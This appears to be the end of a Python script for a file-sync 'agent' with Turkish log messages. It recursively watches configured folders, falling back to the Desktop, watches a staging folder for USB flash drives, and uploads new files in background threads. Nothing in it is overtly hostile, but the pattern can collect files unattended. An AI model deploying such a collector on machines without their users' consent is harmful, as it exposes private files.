    watch_paths = rc.get('watch_paths', [])
    valid_paths = [p for p in watch_paths if os.path.exists(p)]

    queue_manager = QueueManager()
    uploader = Uploader(cfg)
    ai       = SmartFilter(cfg)
    stats    = {'files_uploaded': 0, 'ai_skipped': 0, 'last_file': None}
    start    = time.time()

    if not valid_paths:
        desktop = get_smart_desktop()
        if os.path.exists(desktop):
            valid_paths = [desktop]
            log.info(f'⚠️ Klasör yok, Masaüstü kullanılıyor: {desktop}')

    observer       = Observer()
    active_watches = {}

    for path in valid_paths:
        h = Handler(queue_manager, ai, cfg, path, stats, source_label='PC')
        w = observer.schedule(h, path, recursive=True)
        active_watches[path] = w
        log.info(f'📂 İzleniyor: {path}')

    if STAGE_DIR.exists():
        stage_handler = Handler(queue_manager, ai, cfg, str(STAGE_DIR), stats, source_label='FLASH_STAGE')
        observer.schedule(stage_handler, str(STAGE_DIR), recursive=True)

    observer.start()

    flash_monitor = FlashMonitor(queue_manager, ai, cfg, stats, observer)

    threading.Thread(
        target=initial_sync, args=(queue_manager, ai, valid_paths, rc), daemon=True
    ).start()
    threading.Thread(
        target=heartbeat_loop,
        args=(cfg, stats, queue_manager, ai, observer, active_watches, start),
        daemon=True
    ).start()

    threading.Thread(
        target=background_sync_loop,
        args=(cfg, queue_manager, uploader, flash_monitor),
        daemon=True
    ).start()

    log.info('✅ Agent aktif')

    try:
        while True:
            flash_monitor.poll()
            time.sleep(5)
    except (KeyboardInterrupt, SystemExit):
        observer.stop()
        observer.join()
        log.info('Agent kapatıldı')


if __name__ == '__main__':
    main()